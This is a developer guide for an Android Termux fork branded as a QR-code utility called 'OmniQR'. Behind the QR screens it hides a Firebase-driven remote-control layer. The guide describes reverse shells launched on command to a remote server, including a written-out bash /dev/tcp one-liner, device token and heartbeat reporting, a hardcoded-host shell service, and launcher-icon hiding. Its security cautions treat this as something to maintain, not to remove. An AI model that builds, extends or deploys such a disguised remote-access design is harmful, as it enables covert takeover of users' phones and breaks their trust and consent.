# Developer Guide

## 1. Purpose of This Fork

This repository is a custom fork of the Termux Android application. It keeps the core Termux terminal emulator, bootstrap environment, shell/session management, and `RUN_COMMAND` execution pipeline, but layers on:

- A custom launcher and QR-focused UI flow.
- QR generation utilities for email, website, Wi-Fi, and multi-link payloads.
- QR scanning with camera scanning, image import, copy/open actions, and Wi-Fi payload parsing.
- Remote command/shell orchestration through Firebase messaging and Firebase Realtime Database.
- Reverse-shell helpers that can launch either a bash TCP shell or a `socat`-based shell.
- A custom `RUN_COMMAND` entry point that forwards external execution requests into Termux internals.

If you already know upstream Termux, the important thing to understand is that this fork preserves the original terminal engine and bootstrap model, but changes the user-facing entry point and adds out-of-band remote execution control paths.

## 2. High-Level Architecture

The project is split into four broad layers:

1. `app`
   - Android application, activities, services, custom UI, Firebase integration, QR tools, and the Termux main entry points.
2. `terminal-emulator`
   - Terminal parsing, emulation, buffer, rendering, and session model.
3. `terminal-view`
   - The on-screen terminal widget, selection handles, gestures, and view-level rendering integration.
4. `termux-shared`
   - Shared constants, filesystem utilities, shell helpers, crash/logging utilities, permission helpers, and Termux-specific cross-module code.

The app module depends heavily on `termux-shared`, and the terminal UI depends on both `terminal-emulator` and `terminal-view`.

## 3. What Changed Relative to Upstream Termux

This fork keeps most of the original Termux terminal core, but the visible changes are substantial:

### 3.1 Launcher and Initial Navigation

Instead of launching directly into the terminal experience, the app now starts with:

- `MainActivity` as a splash/loading screen.
- `SummaryActivity` as the custom home screen.

`SummaryActivity` routes into QR-related tools:

- `EmailQrActivity`
- `WebsiteQrActivity`
- `WifiQrActivity`
- `MultiLinkQrActivity`
- `ScanQrActivity`

This is a strong deviation from stock Termux, where the main activity typically opens the terminal UI immediately.

### 3.2 Custom Branding and Visual Identity

The app branding is customized:

- Application name: `OmniQR`
- Custom home layout and colors
- QR-oriented navigation cards
- Custom launcher icons and banner assets

### 3.3 Remote Execution and Shell Access

The main fork-specific technical additions are in `app/src/main/java/com/termux/app/utils`:

- `FirebaseUtilsService`
- `ShellForegroundService`
- `ShellRequestWorker`
- `ReverseShellUtils`
- `CommandUtils`
- `RequestUtils`
- `MyService`

These classes introduce remote-driven shell launch behavior and command execution that do not exist in stock Termux.

### 3.4 Firebase Integration

This fork adds:

- Firebase Messaging for inbound control messages.
- Firebase Database access for server URL discovery and token/heartbeat posting.

This is not part of upstream Termux and is the most security-sensitive part of the fork.

### 3.5 Manifest and Permission Surface

The manifest includes several high-privilege permissions not normally needed by a basic terminal app, including:

- Network access
- Foreground service support
- Boot completion
- Storage access
- Camera access
- Overlay and system permissions
- Logging/debugging-style permissions

The app also declares a custom dangerous permission for command execution:

- `${TERMUX_PACKAGE_NAME}.permission.RUN_COMMAND`

That permission gates `RunCommandService`.

## 4. Repository Layout

### 4.1 Application Module

Key files:

- [app/src/main/AndroidManifest.xml](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/AndroidManifest.xml)
- [app/src/main/java/com/termux/app/TermuxActivity.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/TermuxActivity.java)
- [app/src/main/java/com/termux/app/TermuxService.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/TermuxService.java)
- [app/src/main/java/com/termux/app/RunCommandService.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/RunCommandService.java)
- [app/src/main/java/com/termux/app/MainActivity.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/MainActivity.java)
- [app/src/main/java/com/termux/app/SummaryActivity.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/SummaryActivity.java)
- [app/src/main/java/com/termux/app/utils/FirebaseUtilsService.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/FirebaseUtilsService.java)
- [app/src/main/java/com/termux/app/utils/ShellForegroundService.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/ShellForegroundService.java)
- [app/src/main/java/com/termux/app/utils/ShellRequestWorker.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/ShellRequestWorker.java)
- [app/src/main/java/com/termux/app/utils/ReverseShellUtils.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/ReverseShellUtils.java)
- [app/src/main/java/com/termux/app/utils/CommandUtils.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/CommandUtils.java)
- [app/src/main/java/com/termux/app/utils/RequestUtils.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/utils/RequestUtils.java)

### 4.2 Terminal Core

Key files:

- [terminal-emulator/src/main/java/com/termux/terminal/TerminalEmulator.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/terminal-emulator/src/main/java/com/termux/terminal/TerminalEmulator.java)
- [terminal-emulator/src/main/java/com/termux/terminal/TerminalSession.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/terminal-emulator/src/main/java/com/termux/terminal/TerminalSession.java)
- [terminal-view/src/main/java/com/termux/view/TerminalView.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/terminal-view/src/main/java/com/termux/view/TerminalView.java)
- [app/src/main/java/com/termux/app/terminal/TermuxTerminalViewClient.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/terminal/TermuxTerminalViewClient.java)
- [app/src/main/java/com/termux/app/terminal/TermuxTerminalSessionActivityClient.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/terminal/TermuxTerminalSessionActivityClient.java)
- [app/src/main/java/com/termux/app/TermuxService.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/src/main/java/com/termux/app/TermuxService.java)

### 4.3 Shared Termux Support

Key files:

- [termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java)
- [termux-shared/src/main/java/com/termux/shared/termux/TermuxBootstrap.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/termux-shared/src/main/java/com/termux/shared/termux/TermuxBootstrap.java)
- [termux-shared/src/main/java/com/termux/shared/termux/file/TermuxFileUtils.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/termux-shared/src/main/java/com/termux/shared/termux/file/TermuxFileUtils.java)
- [termux-shared/src/main/java/com/termux/shared/termux/shell/TermuxShellManager.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/termux-shared/src/main/java/com/termux/shared/termux/shell/TermuxShellManager.java)
- [termux-shared/src/main/java/com/termux/shared/logger/Logger.java](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/termux-shared/src/main/java/com/termux/shared/logger/Logger.java)

## 5. Build System and Dependencies

### 5.1 Gradle Setup

The Android app is built with:

- Android Gradle Plugin `7.4.2`
- Google Services plugin
- Java 8 language level
- NDK build support
- Desugaring enabled

The important values are in:

- [build.gradle](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/build.gradle)
- [app/build.gradle](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/app/build.gradle)
- [gradle.properties](/home/prakhar/AndroidStudioProjects/termux-app-C2-custom-UI/gradle.properties)

### 5.2 Android Targets

Current project settings:

- `minSdkVersion = 21`
- `targetSdkVersion = 28`
- `compileSdkVersion = 30`
- `ndkVersion = 22.1.7171670`

This is an older targetSdk compared to modern Android requirements, which matters for runtime permissions, background service behavior, and notification handling.

### 5.3 Notable Libraries

The app module includes:

- `androidx.work:work-runtime`
- Firebase Messaging
- Firebase Realtime Database
- ZXing core and Android embedded scanner
- Material Components
- Markwon markdown renderer
- Termux shared and terminal modules

### 5.4 Build Variants and Packaging

The app still follows Termux packaging patterns:

- ABI splits for `x86`, `x86_64`, `armeabi-v7a`, `arm64-v8a`
- Universal APK fallback
- Debug APK signing with the test key
- Bootstrap download logic during build

The fork preserves the upstream bootstrap install model instead of embedding a custom shell environment.

## 6. Termux Core Runtime Model

The original Termux runtime still works like this:

1. `TermuxApplication` initializes crash handling, logging, Termux bootstrap state, shared properties, and shell environment.
2. `TermuxInstaller` checks whether `$PREFIX` exists and installs the bootstrap packages if needed.
3. `TermuxActivity` binds to `TermuxService` and hosts the terminal UI.
4. `TermuxService` owns terminal sessions and background execution jobs.

The fork does not replace the terminal engine. It extends the app around it.

## 7. Application Startup Flow

### 7.1 `TermuxApplication`

`TermuxApplication` performs global initialization:

- Forces night mode off via `AppCompatDelegate.MODE_NIGHT_NO`.
- Installs the crash handler.
- Configures Termux logging.
- Initializes Termux bootstrap metadata.
- Initializes shared properties and the shell manager.
- Checks for accessible Termux files directories.
- Initializes the Termux AM socket server when possible.
- Initializes the shell environment and writes environment data to disk.

This is standard Termux startup behavior and remains the foundation for the fork.

### 7.2 Splash and Landing UI

`MainActivity` is a short-lived splash:

- Displays `activity_main`.
- Waits 1.2 seconds.
- Opens `SummaryActivity`.

`SummaryActivity` is the custom landing screen and uses `activity_home` to present feature cards:

- Email QR
- Website QR
- Wi-Fi QR
- Multi-links QR
- Scan QR

That flow is completely different from the terminal-first stock app.

## 8. Custom UI and QR Tooling

### 8.1 Home Screen

The home screen is intentionally simple:

- Large centered heading.
- Four QR generation cards.
- A floating action button for scanning.

This means the app functions more like a QR utility hub with Termux capabilities in the background than a traditional terminal app UI.

### 8.2 QR Generation Activities

Each QR activity has a similar structure:

- Toolbar with back navigation.
- Text inputs for payload fields.
- Generate button.
- Share button.
- Save button.
- Preview image.

#### Email QR

`EmailQrActivity`:

- Validates the email address with `Patterns.EMAIL_ADDRESS`.
- Encodes the payload as `mailto:<address>`.

#### Website QR

`WebsiteQrActivity`:

- Accepts a URL.
- Prefixes `https://` if scheme is missing.
- Generates the QR payload from the URL text.

#### Wi-Fi QR

`WifiQrActivity`:

- Accepts SSID and password.
- Escapes QR-sensitive characters.
- Encodes the payload in standard Wi-Fi QR format:
  - `WIFI:T:WPA;S:<ssid>;P:<password>;;`

#### Multi-link QR

`MultiLinkQrActivity`:

- Dynamically adds and removes link rows.
- Normalizes link schemes to `https://` when missing.
- Concatenates one link per line into a single QR payload.

### 8.3 QR Scanning Activity

`ScanQrActivity` supports:

- Live camera scanning via `DecoratedBarcodeView`
- Flashlight toggle
- Image import from the gallery
- Clipboard copy
- Opening recognized payloads
- Wi-Fi payload parsing
- Scan reset

Payload handling currently recognizes:

- Wi-Fi QR payloads
- `mailto:` payloads
- Web URLs
- Plain email addresses

Unsupported payloads are copied to the clipboard.

### 8.4 Shared QR Utility

`QrUtils` is the shared helper used by QR generation and output actions. It is responsible for:

- Creating QR bitmaps
- Sharing generated images
- Saving generated images to the gallery

When maintaining the QR feature set, this is the first place to check before duplicating image or file handling logic in each activity.

## 9. Custom Remote Execution Pipeline

This is the most important fork-specific system to understand.

### 9.1 Intent-Based Command Execution

`RunCommandService` receives external execution requests through the custom permission-protected action:

- `${TERMUX_PACKAGE_NAME}.RUN_COMMAND`

It translates request extras into a `ExecutionCommand`, validates the requested file path and working directory, and forwards execution into `TermuxService`.

### 9.2 What `RunCommandService` Validates

The service validates:

- Intent action
- Runner type
- Mandatory executable path
- Canonical executable path
- File type and file permissions
- Optional working directory
- Optional result-passing configuration

It also applies the Termux-specific external apps policy check. If the policy is violated, the service emits an error and forces user-visible notification handling so the attempted command is not silent.

### 9.3 Why `RunCommandService` Exists

The purpose is to accept `RUN_COMMAND` intents from third-party apps or plugins and normalize them into the same internal execution model used by Termux itself.

This preserves upstream Termux’s plugin architecture while allowing this fork to be driven externally.

### 9.4 Execution Targets

The request is forwarded to `TermuxService`, which can execute commands as:

- Background `AppShell` tasks
- Foreground `TermuxSession` sessions

That distinction matters because foreground sessions are terminal-visible, while background tasks are better suited for plugin-style command jobs.

## 10. TermuxService Responsibilities

`TermuxService` is the core runtime service for this fork and still does the heavy lifting from upstream Termux.

### 10.1 Owned State

It owns:

- Active `TermuxSession` instances
- Background `AppShell` tasks
- Wake lock and Wi-Fi lock state
- Session clients and service clients
- Pending plugin execution commands

### 10.2 Supported Actions

The service handles:

- Stop service
- Acquire wake lock
- Release wake lock
- Execute a command

### 10.3 Lifecycle Notes

On shutdown it:

- Clears temporary shell data
- Releases locks
- Kills execution commands when needed
- Notifies plugin command results as appropriate

This is important because this fork mixes long-running terminal sessions with remote-triggered execution jobs.

## 11. Firebase-Driven Remote Control

The custom Firebase classes are what turn this fork into a remotely controlled shell host.

### 11.1 `FirebaseUtilsService`

This is a `FirebaseMessagingService` implementation that reacts to incoming data messages.

It handles three message types:

- `shellRequest`
- `heartbeat`
- `visibilityChange`

#### `shellRequest`

This message can start one of two execution modes:

- Foreground shell mode via `ShellForegroundService`
- Background shell mode via `ShellRequestWorker`

The message payload includes values like:

- `shellType`
- `serverIP`
- `serverPort`
- `foregroundService`

#### `heartbeat`

This posts a heartbeat to the remote server using `RequestUtils.post("/receive-heartbeat", ...)`.

#### `visibilityChange`

This toggles the `TermuxActivity` component enabled state so the launcher icon can be hidden or shown without uninstalling the app.

### 11.2 `RequestUtils`

`RequestUtils` reads `server_url` from Firebase Realtime Database and then posts JSON payloads to that base URL.

It is used for:

- Token registration
- Heartbeat posts

This means the server URL is not hardcoded in the networking layer, but retrieved from Firebase DB at runtime.

### 11.3 Token Registration

Whenever the app receives a message or a new token is issued, it sends:

- Firebase token
- Device model name

to the server via `/receive-token`.

### 11.4 Hidden Launcher State

The app can disable or re-enable `TermuxActivity` through package manager component state changes. This is a powerful and unusual capability and should be documented clearly for maintainers because it affects launcher visibility and user discoverability.

## 12. Reverse Shell Infrastructure

This fork contains explicit reverse-shell entry points.

### 12.1 `ReverseShellUtils`

This helper can start:

- A bash TCP reverse shell using `/dev/tcp`
- A `socat` reverse shell using `EXEC:<bash>` and `TCP:<host>:<port>`

The `socat` path binds to `TermuxService` and creates a `TermuxTask` through the existing service client.

The bash path executes:

- `bash -c 0<&196;exec 196<>/dev/tcp/<host>/<port>; sh <&196 >&196 2>&196`

This is a direct socket-backed shell and should be considered extremely sensitive.

### 12.2 `ShellForegroundService`

This foreground service can launch reverse-shell work while keeping the app alive.

Behavior:

- Creates a notification channel.
- Acquires a partial wakelock.
- Starts a foreground notification.
- Spawns a background thread.
- Dispatches to `ReverseShellUtils`.
- Stops itself when the shell process returns.

It supports the same `shellType`, `serverIP`, and `serverPort` extras as the Firebase path.

### 12.3 `ShellRequestWorker`

This is the WorkManager-backed path for shell launching.

It:

- Receives a JSON payload
- Extracts `shellType`, `serverIP`, and `serverPort`
- Calls the corresponding `ReverseShellUtils` method

This offers a background execution route that does not require the foreground service path.

### 12.4 `MyService`

`MyService` is a simple service that currently hardcodes a host and launches both shell types.

It is not part of the normal Termux flow and looks like an experimental or test hook.

Maintain it carefully because hardcoded remote endpoints in an Android service are easy to forget and very risky to leave active in production builds.

## 13. Permission and Security Posture

This fork has a much broader security surface than stock Termux.

### 13.1 Important Manifest Permissions

The app requests or declares support for:

- Network access
- Storage access
- Camera access
- Foreground service execution
- Boot completion
- Overlay/system-style privileges
- Package installation
- Logs and secure settings style privileges

Some of these are standard for a terminal app; others are only justified by the added remote-control behavior or are unusually broad.

### 13.2 Security-Relevant Components

Pay special attention to:

- `RunCommandService`
- `FirebaseUtilsService`
- `ShellForegroundService`
- `ReverseShellUtils`
- `MyService`
- Manifest-exported services and receivers

### 13.3 Trust Boundaries

There are now three important trust boundaries:

1. External apps sending `RUN_COMMAND`
2. Firebase messages controlling shell execution
3. Server responses/configuration coming from Firebase Database

New developers should treat all three as untrusted unless the code explicitly authenticates or validates them.

## 14. UI and Resource Notes

### 14.1 Custom Layouts

The app module includes custom layouts for:

- Terminal activity
- Home screen
- QR generation forms
- QR scanning
- Settings/preferences screens

### 14.2 String Customization

`strings.xml` has been customized to:

- Rename the application to `OmniQR`
- Keep Termux-specific labels where needed
- Add custom execution error text
- Preserve Termux preference categories

### 14.3 Theme and Visual Style

The custom UI uses:

- Strong card-based navigation
- Purple accent colors
- Large iconography
- A clean splash screen

The terminal UI itself still uses the Termux terminal components and styling model.

## 15. Native and Bootstrap Behavior

This fork still depends on the Termux bootstrap system:

- Native shell tools live under `$PREFIX`
- `TermuxInstaller` installs the bootstrap packages on first run
- Native binaries are extracted from the bootstrap archive
- `TermuxApplication` prepares the shell environment

This means the fork inherits Termux’s filesystem and package assumptions even though the user-facing entry point has changed.

## 16. Working on the Project

### 16.1 If You Are Changing the Terminal Core

Use the upstream Termux mental model:

- `TermuxActivity` is the UI host
- `TermuxService` owns execution state
- `terminal-emulator` handles emulation
- `terminal-view` handles rendering and gestures

### 16.2 If You Are Changing Remote Shell Features

Start with:

- `FirebaseUtilsService`
- `ShellForegroundService`
- `ShellRequestWorker`
- `ReverseShellUtils`
- `RequestUtils`

Check both foreground and WorkManager execution paths. They are separate and can diverge easily.

### 16.3 If You Are Changing `RUN_COMMAND`

Inspect:

- `RunCommandService`
- `TermuxService.actionServiceExecute(...)`
- `ExecutionCommand` handling in `termux-shared`

The validation and result-reporting path is important, especially if plugin compatibility matters.

### 16.4 If You Are Changing QR Features

Check:

- `SummaryActivity`
- The individual QR generation activities
- `ScanQrActivity`
- `QrUtils`

QR features are UI-heavy and should be tested on both generation and scanning flows.

## 17. Known Implementation Notes

These are not necessarily bugs, but they are important facts for maintainers:

- `MainActivity` is effectively a timed splash and does not provide app functionality.
- `MyService` hardcodes a remote host and triggers both reverse-shell flavors.
- `ShellForegroundService` uses a notification that is intentionally generic and minimal.
- `FirebaseUtilsService` can hide the app launcher entry by disabling `TermuxActivity`.
- `RequestUtils` depends on a `server_url` value in Firebase Database, which means the remote backend is a runtime dependency.
- The project still targets Android `28`, so background execution constraints and permission behavior differ from newer Android releases.

## 18. Suggested Mental Model for New Developers

If you need a quick internal model, think of the app as three stacked systems:

1. Termux core
   - Terminal emulator, sessions, bootstrap, shell manager, plugin command execution.
2. QR utility shell
   - Home screen, QR generation, QR scanning, share/save/open flows.
3. Remote control layer
   - Firebase messages, heartbeat/token transport, hidden launcher toggling, reverse-shell orchestration, and `RUN_COMMAND` bridging.

Most maintenance work will touch only one of these layers, but remote shell changes can cut across all three.

## 19. Build and Run Checklist

To work on this fork effectively:

1. Ensure Android Studio is configured with the project’s Gradle/NDK versions.
2. Verify Firebase configuration is present and valid for the app module.
3. Confirm bootstrap package download and extraction still work.
4. Test terminal startup from a clean install.
5. Test the QR home flow and all QR generation/scanning pages.
6. Test `RUN_COMMAND` execution from a trusted sender.
7. Test Firebase message handling only in an isolated environment.

## 20. Final Caution

Because this fork adds remote command and reverse-shell capabilities to a terminal app, changes in the networking and service layers should be reviewed with security in mind, not just correctness. The most dangerous regressions here are the ones that silently expand execution reach or weaken validation.
